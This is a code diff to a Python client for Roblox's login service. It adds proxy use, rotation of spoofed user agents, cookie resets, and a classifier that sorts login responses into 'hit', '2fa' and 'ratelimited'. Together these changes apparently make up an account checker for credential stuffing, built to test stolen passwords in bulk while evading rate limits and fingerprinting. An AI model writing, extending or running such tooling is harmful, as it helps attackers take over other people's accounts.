@@ -1,11 +1,26 @@
+import random
+
 import config, util
 
 AUTH = "https://auth.roblox.com"
 
+UAS = [
+    "Roblox/WinInet",
+    "Roblox/2.616.551 (Android; Android 12; SM-G991B)",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36",
+]
+
 
 class Roblox:
-    def __init__(self, ua=None, timeout=None):
-        self.s = util.Session(ua or config.UA, timeout or config.HTTP_TIMEOUT)
+    def __init__(self, ua=None, timeout=None, proxy=None):
+        self.s = util.Session(ua or config.UA, timeout or config.HTTP_TIMEOUT,
+                              proxy if proxy is not None else (config.PROXY or None))
+
+    def reset(self, rotate=False):
+        self.s.clear_cookies()
+        if rotate:
+            self.s.ua = random.choice(UAS)
 
     def csrf(self):
         self.s.request("GET", AUTH + "/v2/login")
@@ -26,6 +41,8 @@ class Roblox:
 
 def classify(code, hdr, js, text):
     if code == 200:
+        if isinstance(js, dict) and js.get("twoStepVerificationRequired"):
+            return "2fa", "twoStepVerificationRequired"
         return "hit", "ok"
     if code == 429:
         return "ratelimited", hdr.get("Retry-After") or ""
